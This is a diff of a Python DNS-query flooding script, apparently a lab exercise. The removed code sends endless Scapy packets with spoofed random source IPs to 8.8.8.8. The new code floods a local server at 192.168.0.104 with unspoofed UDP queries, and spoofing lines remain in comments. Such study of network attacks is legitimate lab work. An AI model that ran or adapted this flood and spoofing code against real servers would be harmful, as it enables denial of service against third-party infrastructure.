@@ -4,7 +4,7 @@ import socket
 import random
 import signal
 from DNS_QueryBuilder import *
-from kamene.all import *
+from scapy.all import *
 
 cnt = 0
 
@@ -15,33 +15,25 @@ def keyboardInterruptHandler(signal, frame):
 
 signal.signal(signal.SIGINT, keyboardInterruptHandler)
 
-# the invalid domains are sent but no response returns
-domains = ['codeforces.com', 'codechef.com', 'buet.ac.bd', 'cse.buet.ac.bd', 'youtube.com', \
-		   'github.com', 'ubuntu.com', 'example.com', 'cse.buet.ac.bd', 'en.wikipedia.org']
+q = dns_query()
+q.setShowError(True)
+q.setShowReport(True)
+q.setDomainName("codeforces.com")
+
+payload = q.getDNSQuery()
+payload = binascii.unhexlify(payload)
+
+# variables for udp where the ip is not spoofed
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+server_ip='192.168.0.104'
+port=53
+
+# spoofed_packet = IP(src='192.168.0.107', dst='192.168.0.104') / UDP(sport=107, dport=53) / payload
+# sock = conf.L3socket(iface='enp0s3')
 
 while True:
 
-	src_ip = '192.168.0.' + str(random.randint(10, 110))
-	dest_ip = '8.8.8.8'
-
-	src_port = 107
-	dest_port = 53
-
-	# --------------------------------
-	# dns query - select a random domain
-	random_domain = random.randint(0, len(domains) - 1)
-	
-	q = dns_query()
-	q.setShowError(True)
-	q.setShowReport(True)
-	q.setDomainName(domains[random_domain])
-
-	payload = q.getDNSQuery()
-	payload = binascii.unhexlify(payload)
-	# --------------------------------
-
-
-	spoofed_packet = IP(src=src_ip, dst=dest_ip) / UDP(sport=src_port, dport=dest_port) / payload
-	send(spoofed_packet)
+	#sock.send(spoofed_packet)
 
 	cnt += 1
+	sock.sendto(payload, (server_ip, port))
